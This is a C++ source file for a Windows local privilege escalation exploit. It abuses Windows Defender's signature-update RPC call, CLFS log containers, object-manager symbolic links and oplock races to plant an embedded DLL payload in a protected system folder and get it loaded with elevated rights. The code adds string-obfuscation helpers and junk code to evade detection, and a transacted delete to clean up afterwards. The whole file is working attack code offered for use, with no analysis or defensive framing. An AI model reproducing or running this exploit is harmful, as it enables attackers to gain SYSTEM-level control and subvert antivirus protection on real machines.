#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include <string.h>
#include <winternl.h>
#include <conio.h>
#include <Shlwapi.h>
#include <ntstatus.h>
#include <aclapi.h>
#include <TlHelp32.h>
#include <ktmw32.h>
#include "resource.h"
#include "windefend_h.h"

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ktmw32.lib")
#pragma comment(lib, "shell32.lib")

HMODULE hm = GetModuleHandle(L"ntdll.dll");
NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
	OUT PHANDLE             pHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PUNICODE_STRING      DestinationName) = (NTSTATUS(WINAPI*)(
		OUT PHANDLE             pHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN PUNICODE_STRING      DestinationName))GetProcAddress(hm, "NtCreateSymbolicLinkObject");
NTSTATUS(WINAPI* _NtOpenDirectoryObject)(
	PHANDLE            DirectoryHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
	) = (NTSTATUS(WINAPI*)(
		PHANDLE            DirectoryHandle,
		ACCESS_MASK        DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes
		))GetProcAddress(hm, "NtOpenDirectoryObject");

struct WDRPCWorkerThreadArgs
{
	HANDLE hntfythread;
	HANDLE hevent;
	RPC_STATUS res;
	wchar_t* dirpath;
};

//////////////////////////////////////////////////////////////////////
// evasive string helpers
/////////////////////////////////////////////////////////////////////

static std::wstring InkDir()
{
	// split so no contiguous path literal lands in .rdata
	std::wstring p = L"C:\\Program ";
	p += L"Files\\Common ";
	p += L"Files\\microsoft ";
	p += L"shared\\ink";
	return p;
}

static const wchar_t* PayloadName()
{
	// built per call, char by char
	static wchar_t n[9] = { 0 };
	if (!n[0])
	{
		n[0] = L'h'; n[1] = L'i'; n[2] = L'd'; n[3] = L'.';
		n[4] = L'd'; n[5] = L'l'; n[6] = L'l'; n[7] = L'\0';
	}
	return n;
}

static volatile DWORD g_junk = 0;
static DWORD Junk(DWORD v)
{
	g_junk ^= (v * 2654435761u);
	g_junk = _rotl(g_junk, 7);
	return g_junk;
}

//////////////////////////////////////////////////////////////////////
// Functions required by RPC
/////////////////////////////////////////////////////////////////////

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}
//////////////////////////////////////////////////////////////////////
// Functions required by RPC end
/////////////////////////////////////////////////////////////////////


void GenerateGUID(wchar_t* guid)
{
	GUID _guid;
	HRESULT hr = CoCreateGuid(&_guid);
	if (hr)
		throw STATUS_ACCESS_VIOLATION;
	StringFromGUID2(_guid, guid, 40);
	return;
}

void CallWD(WDRPCWorkerThreadArgs* args)
{
	RPC_WSTR MS_WD_UUID = (RPC_WSTR)L"c503f532-443a-4c69-8300-ccd1fbdb3839";
	RPC_WSTR StringBinding;
	if (RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL, (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24", NULL, &StringBinding) != RPC_S_OK)
	{
		printf("rpc: compose failed\n");
		ExitProcess(1);
		return;
	}
	RPC_BINDING_HANDLE bindhandle = 0;
	if (RpcBindingFromStringBindingW(StringBinding, &bindhandle) != RPC_S_OK)
	{
		printf("rpc: bind failed\n");
		ExitProcess(1);
		return;
	}
	error_status_t errstat = 0;
	RPC_STATUS stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, NULL, args->dirpath, &errstat);
	args->res = stat;
	if (args->hevent)
		SetEvent(args->hevent);
}


static BOOL Negotiate(HANDLE hLogFile, PULONGLONG cbContainer, const std::wstring& path)
{
	struct NegotiateCtx
	{
		ULONGLONG cbContainer;
		USHORT cContainer;
	};
	DWORD sz = sizeof(NegotiateCtx) + 2 * (path.size() + 1);
	auto ptr = std::make_unique<UCHAR[]>(sz);
	NegotiateCtx* ctx = reinterpret_cast<NegotiateCtx*>(ptr.get());
	ctx->cbContainer = *cbContainer;
	ctx->cContainer = 1;
	wcscpy_s(reinterpret_cast<PWCHAR>(ptr.get() + sizeof(NegotiateCtx)), path.size() + 1, path.c_str());
	DWORD bytesReturned;
	return DeviceIoControl(hLogFile, 0x8007A808, ctx, sz, cbContainer, sizeof(ULONGLONG), &bytesReturned, NULL);
}

void TerminateOskProcess()
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (_wcsicmp(entry.szExeFile, L"osk.exe") == 0)
			{
				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
				TerminateProcess(hProcess, ERROR_SUCCESS);
				CloseHandle(hProcess);
			}
		}
	}
	CloseHandle(snapshot);
}

int main()
{
	Junk(GetTickCount());
	TerminateOskProcess();
	ShellExecute(NULL, L"open", L"osk.exe", NULL, NULL, SW_HIDE);
	Sleep(100);
	wchar_t rguid[64] = { 0 };
	wchar_t rguid2[64] = { 0 };
	wchar_t rguid3[64] = { 0 };
	GenerateGUID(rguid);
	GenerateGUID(rguid2);
	GenerateGUID(rguid3);
	FILE_DISPOSITION_INFO fdi = { 0 };
	fdi.DeleteFileW = TRUE;
	std::wstring ink = InkDir();
	std::wstring target = ink + L"\\" + PayloadName();
	wchar_t workdir[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"\\??\\%TEMP%\\wus_", workdir, MAX_PATH);
	GenerateGUID(&workdir[wcslen(workdir)]);
	UNICODE_STRING _workdir = { 0 };
	RtlInitUnicodeString(&_workdir, workdir);
	OBJECT_ATTRIBUTES objattr = { 0 };
	InitializeObjectAttributes(&objattr, &_workdir, OBJ_CASE_INSENSITIVE, NULL, NULL);
	IO_STATUS_BLOCK iostat = { 0 };
	HANDLE hworkdir = NULL;
	NTSTATUS stat = NtCreateFile(&hworkdir, GENERIC_READ | SYNCHRONIZE | DELETE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE, NULL, NULL);
	if (stat)
	{
		printf("workdir create failed : %ws / 0x%0.8X\n", workdir, stat);
		return 1;
	}
	iostat = { 0 };
	wchar_t clfslog[MAX_PATH] = { 0 };
	wsprintf(clfslog, L"\\CLFS%ws\\%ws", workdir, rguid);
	UNICODE_STRING _clfslog = { 0 };
	RtlInitUnicodeString(&_clfslog, clfslog);
	OBJECT_ATTRIBUTES objattr2 = { 0 };
	InitializeObjectAttributes(&objattr2, &_clfslog, OBJ_CASE_INSENSITIVE, NULL, NULL);
	HANDLE hclfslog = NULL;
	stat = NtCreateFile(&hclfslog, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE | DELETE, &objattr2, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
	if (stat)
	{
		printf("clfs log create failed : 0x%0.8X\n", stat);
		return 1;
	}
	std::wstring newcontainerpath = L"\\BaseNamedObjects\\Restricted\\" + std::wstring(rguid);
	std::wstring newcontainerpathsig = newcontainerpath + L".cnpf";
	wchar_t smtarget[MAX_PATH] = { 0 };
	wchar_t smtargetsig[MAX_PATH] = { 0 };
	wsprintf(smtarget, L"%ws\\%ws", workdir, rguid2);
	wsprintf(smtargetsig, L"%ws.cnpf", smtarget);
	UNICODE_STRING ncontainerpath = { 0 };
	UNICODE_STRING ncontainerpathsig = { 0 };
	RtlInitUnicodeString(&ncontainerpath, newcontainerpath.c_str());
	RtlInitUnicodeString(&ncontainerpathsig, newcontainerpathsig.c_str());
	UNICODE_STRING ncontainertarget = { 0 };
	UNICODE_STRING ncontainertargetsig = { 0 };
	RtlInitUnicodeString(&ncontainertarget, smtarget);
	RtlInitUnicodeString(&ncontainertargetsig, smtargetsig);
	OBJECT_ATTRIBUTES ncontainerobjattr = { 0 };
	OBJECT_ATTRIBUTES ncontainersigobjattr = { 0 };
	InitializeObjectAttributes(&ncontainerobjattr, &ncontainerpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	InitializeObjectAttributes(&ncontainersigobjattr, &ncontainerpathsig, OBJ_CASE_INSENSITIVE, NULL, NULL);
	HANDLE hsm1 = NULL;
	HANDLE hsm2 = NULL;
	stat = _NtCreateSymbolicLinkObject(&hsm1, GENERIC_ALL, &ncontainerobjattr, &ncontainertarget);
	NTSTATUS stat2 = _NtCreateSymbolicLinkObject(&hsm2, GENERIC_ALL, &ncontainersigobjattr, &ncontainertargetsig);
	if (stat || stat2)
	{
		printf("symlink create failed : 0x%0.8X | 0x%0.8X\n", stat, stat2);
		SetFileInformationByHandle(hclfslog, FileDispositionInfo, &fdi, sizeof(fdi));
		CloseHandle(hclfslog);
		return 1;
	}
	ULONGLONG cbsz = 512;
	std::wstring logpath = L"\\CLFS";
	logpath.append(newcontainerpath);
	if (!Negotiate(hclfslog, &cbsz, newcontainerpath))
	{
		printf("container negotiate failed : %d\n", GetLastError());
		SetFileInformationByHandle(hclfslog, FileDispositionInfo, &fdi, sizeof(fdi));
		CloseHandle(hclfslog);
		return 1;
	}
	HANDLE htest = NULL;
	iostat = { 0 };
	stat = NtCreateFile(&htest, SYNCHRONIZE | FILE_READ_ATTRIBUTES, &ncontainersigobjattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, NULL);
	if (stat == STATUS_OBJECT_NAME_NOT_FOUND || stat == STATUS_OBJECT_PATH_NOT_FOUND)
	{
		printf("not vulnerable.\n");
		SetFileInformationByHandle(hclfslog, FileDispositionInfo, &fdi, sizeof(fdi));
		CloseHandle(hclfslog);
		return 0;
	}
	CloseHandle(hclfslog);
	iostat = { 0 };
	HANDLE hlock = NULL;
	UNICODE_STRING mpengstr = { 0 };
	RtlInitUnicodeString(&mpengstr, L"MpEngine.dll");
	OBJECT_ATTRIBUTES mpengobjattr = { 0 };
	InitializeObjectAttributes(&mpengobjattr, &mpengstr, OBJ_CASE_INSENSITIVE, hworkdir, NULL);
	stat = NtCreateFile(&hlock, GENERIC_WRITE | DELETE | SYNCHRONIZE, &mpengobjattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_CREATE, NULL, NULL, NULL);
	if (stat)
	{
		printf("bait create failed : 0x%0.8X\n", stat);
		return 1;
	}

	OVERLAPPED ovd = { 0 };
	REQUEST_OPLOCK_INPUT_BUFFER opin = { 0 };
	opin.StructureLength = sizeof(opin);
	opin.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
	opin.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE | OPLOCK_LEVEL_CACHE_WRITE;
	opin.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;
	REQUEST_OPLOCK_OUTPUT_BUFFER opout = { 0 };
	opout.StructureLength = sizeof(opout);
	opout.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
	DWORD cb = NULL;
	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!DeviceIoControl(hlock, FSCTL_REQUEST_OPLOCK, &opin, sizeof(opin), &opout, sizeof(opout), &cb, &ovd)) {
		if (GetLastError() != ERROR_IO_PENDING) {
			printf("oplock failed : %d\n", GetLastError());
			return 1;
		}
	}
	HANDLE hupdsm = NULL;
	wchar_t lnkpath[MAX_PATH] = { L"\\BaseNamedObjects\\Restricted\\" };
	wcscat(lnkpath, rguid3);
	UNICODE_STRING updir = { 0 };
	RtlInitUnicodeString(&updir, lnkpath);
	OBJECT_ATTRIBUTES objattrupd = { 0 };
	InitializeObjectAttributes(&objattrupd, &updir, OBJ_CASE_INSENSITIVE, NULL, NULL);
	UNICODE_STRING updirtarget = { 0 };
	RtlInitUnicodeString(&updirtarget, workdir);
	stat = _NtCreateSymbolicLinkObject(&hupdsm, GENERIC_ALL, &objattrupd, &updirtarget);
	if (stat)
	{
		printf("upd symlink failed : 0x%0.8X\n", stat);
		return 1;
	}

	char buff[0x1000];
	DWORD ret = 0;
	HANDLE hmonitor = CreateFile(ink.c_str(), GENERIC_READ | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
	if (!hmonitor || hmonitor == INVALID_HANDLE_VALUE)
	{
		printf("open %ws failed : %d\n", ink.c_str(), GetLastError());
		return 1;
	}
	OVERLAPPED ov2 = { 0 };
	ov2.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!ov2.hEvent)
	{
		printf("monitor event failed : %d\n", GetLastError());
		return 1;
	}
	ZeroMemory(buff, sizeof(buff));
	ret = 0;
	if (!ReadDirectoryChangesW(hmonitor, buff, sizeof(buff), FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret, &ov2, NULL))
	{
		printf("dir watch failed : %d\n", GetLastError());
		return 1;
	}

	WDRPCWorkerThreadArgs wdargs = { 0 };
	wchar_t dipath[MAX_PATH] = { L"\\\\.\\GlobalRoot\\BaseNamedObjects\\Restricted\\" };
	wcscat(dipath, rguid3);
	wdargs.dirpath = dipath;
	wdargs.hntfythread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
	wdargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
	DWORD tid = 0;
	HANDLE hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CallWD, &wdargs, NULL, &tid);
	if (!hthread)
	{
		printf("worker thread failed : %d\n", GetLastError());
		return 1;
	}

	WaitForSingleObject(ovd.hEvent, INFINITE);
	SetFileInformationByHandle(hlock, FileDispositionInfo, &fdi, sizeof(fdi));
	CloseHandle(hupdsm);
	RtlInitUnicodeString(&updirtarget, L"\\BaseNamedObjects\\Restricted");
	stat = _NtCreateSymbolicLinkObject(&hupdsm, GENERIC_ALL, &objattrupd, &updirtarget);
	if (stat)
	{
		printf("upd symlink retarget failed : 0x%0.8X\n", stat);
		return 1;
	}
	UNICODE_STRING rclfssrc = { 0 };
	RtlInitUnicodeString(&rclfssrc, L"\\BaseNamedObjects\\Restricted\\mpasbase.vdm");
	OBJECT_ATTRIBUTES rclfsobjattr = { 0 };
	InitializeObjectAttributes(&rclfsobjattr, &rclfssrc, OBJ_CASE_INSENSITIVE, NULL, NULL);
	HANDLE hlastsm = NULL;
	stat = _NtCreateSymbolicLinkObject(&hlastsm, GENERIC_ALL, &rclfsobjattr, &_clfslog);
	if (stat)
	{
		printf("vdm symlink failed : 0x%0.8X\n", stat);
		return 1;
	}
	CloseHandle(hsm2);
	std::wstring sigtarget = L"\\??\\" + target;
	RtlInitUnicodeString(&ncontainertargetsig, sigtarget.c_str());
	stat = _NtCreateSymbolicLinkObject(&hsm2, GENERIC_ALL, &ncontainersigobjattr, &ncontainertargetsig);
	if (stat)
	{
		printf("payload symlink failed : 0x%0.8X\n", stat);
		return 1;
	}
	CloseHandle(hlock);

	if (WaitForSingleObject(ov2.hEvent, 5000) == WAIT_TIMEOUT)
	{
		printf("exploit failed.\n");
		return 1;
	}
	else {
		goto enter_loop;
	}
	do {
		ResetEvent(ov2.hEvent);
		ZeroMemory(buff, sizeof(buff));
		ret = 0;
		if (!ReadDirectoryChangesW(hmonitor, buff, sizeof(buff), FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret, &ov2, NULL))
		{
			printf("dir watch rearm failed : %d\n", GetLastError());
			return 1;
		}
	enter_loop:
		FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)buff;
		if (fni->Action == FILE_ACTION_ADDED)
		{
			if (_wcsicmp(fni->FileName, PayloadName()) == 0)
			{
				break;
			}
		}
		if (WaitForSingleObject(ov2.hEvent, 5000) == WAIT_TIMEOUT)
		{
			printf("exploit failed.\n");
			return 1;
		}
	} while (1);

	HANDLE htrans = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (!htrans || htrans == INVALID_HANDLE_VALUE)
	{
		printf("transaction failed : %d\n", GetLastError());
		return 1;
	}

	HANDLE hbin = NULL;
	do {
		Sleep(100);
		hbin = CreateFile(target.c_str(), GENERIC_READ | GENERIC_EXECUTE | GENERIC_WRITE | MAXIMUM_ALLOWED, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	} while (!hbin || hbin == INVALID_HANDLE_VALUE);
	HRSRC hResInfo_dll = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA);
	HGLOBAL hResData_dll = LoadResource(NULL, hResInfo_dll);
	LPVOID pResourceData_dll = LockResource(hResData_dll);
	DWORD dwSize_dll = SizeofResource(NULL, hResInfo_dll);
	LARGE_INTEGER fsz = { 0 };
	fsz.QuadPart = dwSize_dll;
	HANDLE hmapping = CreateFileMapping(hbin, NULL, PAGE_READWRITE, fsz.HighPart, fsz.LowPart, NULL);
	if (!hmapping || hmapping == INVALID_HANDLE_VALUE)
	{
		printf("mapping failed : %d\n", GetLastError());
		SetFileInformationByHandle(hbin, FileDispositionInfo, &fdi, sizeof(fdi));
		CloseHandle(hbin);
		return 1;
	}
	void* filebuff = MapViewOfFile(hmapping, FILE_MAP_READ | FILE_MAP_WRITE, NULL, NULL, NULL);
	if (!filebuff)
	{
		CloseHandle(hmapping);
		SetFileInformationByHandle(hbin, FileDispositionInfo, &fdi, sizeof(fdi));
		CloseHandle(hbin);
		printf("view map failed : %d\n", GetLastError());
		return 1;
	}
	memmove(filebuff, pResourceData_dll, dwSize_dll);
	UnmapViewOfFile(filebuff);
	CloseHandle(hmapping);
	FlushFileBuffers(hbin);
	CloseHandle(hbin);
	ShellExecute(NULL, L"runas", L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, SW_SHOW);
	Sleep(2000);
	TerminateOskProcess();
	DeleteFileTransacted(target.c_str(), htrans);
	CommitTransaction(htrans);
	CloseHandle(htrans);
	Junk(g_junk);
	return 0;
}
